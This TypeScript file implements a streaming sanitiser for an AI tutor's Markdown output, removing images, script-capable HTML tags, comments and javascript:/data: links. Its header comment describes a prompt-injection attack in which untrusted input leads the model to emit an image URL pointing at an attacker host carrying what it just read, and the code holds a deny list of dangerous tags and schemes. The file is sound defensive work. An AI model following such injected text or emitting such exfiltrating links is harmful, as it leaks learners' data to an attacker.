/**
 * Filter applied to what the model writes, before it reaches the browser (defence in depth: the browser also refuses to
 * draw images, see components/ai/ai-markdown.tsx).
 *
 * Why: the tutor reads untrusted material (shared code, console output printed by the program, file names, lesson
 * text). If that material talks the model into emitting `![](https://attacker/?q=<what it just read>)`, the browser
 * fetching that "image" would carry the learner's data to the attacker. The model has no tools, so this is the only
 * channel it has, and it is closed here:
 *
 *  - Markdown images become their alt text (reference-style images too).
 *  - HTML elements that load or run something (img, script, iframe, object, form, svg...) and HTML comments are removed.
 *  - Links with an executable or data scheme (javascript:, data:, vbscript:, file:, blob:) point at "#" instead.
 *
 * Code is left alone: fenced blocks and inline code spans pass through verbatim, because the tutor legitimately shows
 * HTML and Markdown there (and react-markdown never interprets raw HTML anyway).
 *
 * The model's text arrives in arbitrary pieces, so the filter is incremental: when a piece ends in the middle of
 * something that might be an image, a tag or a link target it holds that part back until the rest arrives (bounded: a
 * construct that never closes within LOOKAHEAD characters is plain text).
 */

/** Longest construct (image, tag, link target, code span) the filter waits for before treating it as plain text. */
const LOOKAHEAD = 4_000;

/** Elements that fetch, run, submit or embed something. Others (b, kbd, Array<number>...) are left as text. */
const DANGEROUS_TAGS = new Set([
  "img", "picture", "source", "video", "audio", "track", "iframe", "frame", "frameset", "object", "embed", "applet",
  "script", "style", "link", "meta", "base", "form", "input", "button", "textarea", "select", "option", "svg", "math",
  "foreignobject", "template", "noscript", "portal", "use", "image",
]);

const UNSAFE_SCHEME = /^(?:javascript|data|vbscript|file|blob):/i;

type Mode = "text" | "fenceInfo" | "fence";

interface State {
  mode: Mode;
  lineStart: boolean;
  fenceChar: string;
  fenceLength: number;
}

interface Step {
  out: string;
  /** How far the input was consumed; less than its length means "wait for more input starting here". */
  consumed: number;
}

/** Controls, spaces and DEL..C1: removed from a link target before its scheme is read, as browsers do. */
const CONTROLS_AND_SPACES = new RegExp("[\\u0000-\\u0020\\u007F-\\u009F]+", "g");

/** `&#106;avascript:` -> `javascript:`: Markdown decodes character references in link targets, so the check must too. */
function decodeNumericReferences(text: string): string {
  return text.replace(/&#(x[0-9a-f]+|[0-9]+);?/gi, (whole, code: string) => {
    const value = code[0].toLowerCase() === "x" ? parseInt(code.slice(1), 16) : parseInt(code, 10);
    return Number.isFinite(value) && value > 0 && value < 0x110000 ? String.fromCodePoint(value) : whole;
  });
}

/** Text of a Markdown image's alt part, without escapes and nested markup characters. */
function plainAlt(alt: string): string {
  return alt.replace(/\\([\\`*_{}[\]()#+\-.!<>|])/g, "$1").replace(/[`*_~]/g, "").replace(/\s+/g, " ").trim();
}

/** Index of the bracket closing the one opened just before `from`, or -1. */
function matchingClose(text: string, from: number, open: string, close: string, limit: number): number {
  let depth = 1;
  const end = Math.min(text.length, from + limit);
  for (let i = from; i < end; i++) {
    const ch = text[i];
    if (ch === "\\") {
      i++;
      continue;
    }
    if (ch === open) depth++;
    else if (ch === close && --depth === 0) return i;
  }
  return -1;
}

function run(buf: string, state: State, final: boolean): Step {
  let out = "";
  let i = 0;
  const n = buf.length;

  /** True when `index` is so near the end that the construct starting at `start` may still be completed. */
  const mayComplete = (start: number) => !final && n - start < LOOKAHEAD;

  while (i < n) {
    // ── Lines inside or around fences are decided at their start ──
    if (state.lineStart && state.mode !== "fenceInfo") {
      const rest = buf.slice(i, i + 200);
      const lineEnd = rest.indexOf("\n");
      const probe = lineEnd === -1 ? rest : rest.slice(0, lineEnd);
      const fence = /^ {0,3}(`{3,}|~{3,})/.exec(probe);

      if (state.mode === "fence") {
        // A closing fence is the fence character repeated at least as often as the opener, alone on its line
        const closer = new RegExp(`^ {0,3}\\${state.fenceChar}{${state.fenceLength},}[ \\t]*$`);
        const couldStillBeCloser = /^ {0,3}[`~]*[ \t]*$/.test(probe);
        if (lineEnd === -1 && couldStillBeCloser && !final && probe.length < 150) return { out, consumed: i };
        if (closer.test(probe)) {
          state.mode = "text";
        }
        // The fence content (and its closing line) passes through untouched
        const stop = lineEnd === -1 ? n : i + lineEnd + 1;
        out += buf.slice(i, stop);
        state.lineStart = lineEnd !== -1;
        i = stop;
        continue;
      }

      // text mode: is this line opening a fence?
      const couldBeOpener = /^ {0,3}[`~]{0,2}$/.test(probe) || (fence !== null && lineEnd === -1 && fence[0].length === probe.length);
      if (lineEnd === -1 && couldBeOpener && !final && probe.length < 150) return { out, consumed: i };
      if (fence) {
        state.mode = "fenceInfo";
        state.fenceChar = fence[1][0];
        state.fenceLength = fence[1].length;
        // fall through: the opening line (fence + info string) is copied below
      }
    }

    // The rest of a line inside a fence (the previous piece ended mid-line) is verbatim too
    if (state.mode === "fence") {
      const stop = buf.indexOf("\n", i);
      out += stop === -1 ? buf.slice(i) : buf.slice(i, stop + 1);
      state.lineStart = stop !== -1;
      i = stop === -1 ? n : stop + 1;
      continue;
    }

    const ch = buf[i];

    if (state.mode === "fenceInfo") {
      const stop = buf.indexOf("\n", i);
      if (stop === -1) {
        out += buf.slice(i);
        i = n;
        state.lineStart = false;
      } else {
        out += buf.slice(i, stop + 1);
        i = stop + 1;
        state.mode = "fence";
        state.lineStart = true;
      }
      continue;
    }

    // ── Inline code is verbatim ──
    if (ch === "`") {
      let runEnd = i;
      while (runEnd < n && buf[runEnd] === "`") runEnd++;
      if (runEnd === n && !final) return { out, consumed: i }; // the run may continue
      const ticks = buf.slice(i, runEnd);
      let search = runEnd;
      let close = -1;
      for (;;) {
        const found = buf.indexOf(ticks, search);
        if (found === -1) break;
        // a longer run is not the closer
        if (buf[found - 1] === "`" || buf[found + ticks.length] === "`") {
          search = found + 1;
          while (buf[search] === "`") search++;
          continue;
        }
        close = found;
        break;
      }
      const blankLine = close === -1 ? /\n[ \t]*\n/.test(buf.slice(runEnd, runEnd + LOOKAHEAD)) : /\n[ \t]*\n/.test(buf.slice(runEnd, close));
      if (close !== -1 && !blankLine) {
        out += buf.slice(i, close + ticks.length);
        state.lineStart = false;
        i = close + ticks.length;
        continue;
      }
      if (close === -1 && !blankLine && mayComplete(i)) return { out, consumed: i };
      out += ticks; // an unclosed run is literal backticks
      state.lineStart = false;
      i = runEnd;
      continue;
    }

    // ── Images ──
    if (ch === "!") {
      if (i === n - 1 && !final) return { out, consumed: i };
      if (buf[i + 1] === "[") {
        const altEnd = matchingClose(buf, i + 2, "[", "]", 1_000);
        if (altEnd === -1) {
          if (mayComplete(i)) return { out, consumed: i };
        } else {
          const after = buf[altEnd + 1];
          if (after === undefined && !final) return { out, consumed: i };
          if (after === "(" || after === "[") {
            const close = matchingClose(buf, altEnd + 2, after, after === "(" ? ")" : "]", LOOKAHEAD);
            if (close === -1) {
              if (mayComplete(i)) return { out, consumed: i };
            } else {
              const alt = plainAlt(buf.slice(i + 2, altEnd));
              out += alt || "[image]";
              state.lineStart = false;
              i = close + 1;
              continue;
            }
          } else {
            // ![alt] alone: a shortcut reference image
            out += plainAlt(buf.slice(i + 2, altEnd)) || "[image]";
            state.lineStart = false;
            i = altEnd + 1;
            continue;
          }
        }
      }
    }

    // ── Link targets ──
    if (ch === "]" && i === n - 1 && !final) return { out, consumed: i }; // "(" may follow in the next piece
    if (ch === "]" && buf[i + 1] === "(") {
      const close = matchingClose(buf, i + 2, "(", ")", LOOKAHEAD);
      if (close === -1) {
        if (mayComplete(i)) return { out, consumed: i };
      } else {
        const target = decodeNumericReferences(buf.slice(i + 2, close)).replace(CONTROLS_AND_SPACES, "").replace(/^</, "");
        if (UNSAFE_SCHEME.test(target)) {
          out += "](#)";
          state.lineStart = false;
          i = close + 1;
          continue;
        }
      }
    }

    // ── HTML ──
    if (ch === "<") {
      // "<!-" at the end of the piece may be the start of a comment
      if (!final && n - i < 4 && "<!--".startsWith(buf.slice(i))) return { out, consumed: i };
      if (buf.startsWith("<!--", i)) {
        const end = buf.indexOf("-->", i + 4);
        if (end === -1) {
          if (mayComplete(i)) return { out, consumed: i };
        } else {
          state.lineStart = false;
          i = end + 3;
          continue;
        }
      } else if (n - i < 2 || (buf[i + 1] === "/" && n - i < 3)) {
        if (!final) return { out, consumed: i };
      } else {
        const named = /^<\/?([A-Za-z][A-Za-z0-9-]*)/.exec(buf.slice(i, i + 40));
        if (named) {
          const nameEndsAtBuffer = i + named[0].length === n;
          if (nameEndsAtBuffer && !final) return { out, consumed: i };
          if (DANGEROUS_TAGS.has(named[1].toLowerCase())) {
            // find the closing ">" outside quotes
            let quote = "";
            let end = -1;
            const limit = Math.min(n, i + LOOKAHEAD);
            for (let k = i + named[0].length; k < limit; k++) {
              const c = buf[k];
              if (quote) {
                if (c === quote) quote = "";
              } else if (c === '"' || c === "'") quote = c;
              else if (c === ">") {
                end = k;
                break;
              }
            }
            if (end === -1) {
              if (mayComplete(i)) return { out, consumed: i };
            } else {
              state.lineStart = false;
              i = end + 1;
              continue;
            }
          }
        }
      }
    }

    out += ch;
    state.lineStart = ch === "\n";
    i++;
  }
  return { out, consumed: n };
}

/** Incremental filter: `push` each piece of the model's text, `flush` at the end. */
export class AiOutputFilter {
  private carry = "";
  private readonly state: State = { mode: "text", lineStart: true, fenceChar: "`", fenceLength: 3 };

  push(chunk: string): string {
    const buf = this.carry + chunk;
    const { out, consumed } = run(buf, this.state, false);
    this.carry = buf.slice(consumed);
    return out;
  }

  flush(): string {
    const buf = this.carry;
    this.carry = "";
    return run(buf, this.state, true).out;
  }
}

/** The whole text at once. */
export function filterAiOutput(text: string): string {
  const filter = new AiOutputFilter();
  return filter.push(text) + filter.flush();
}
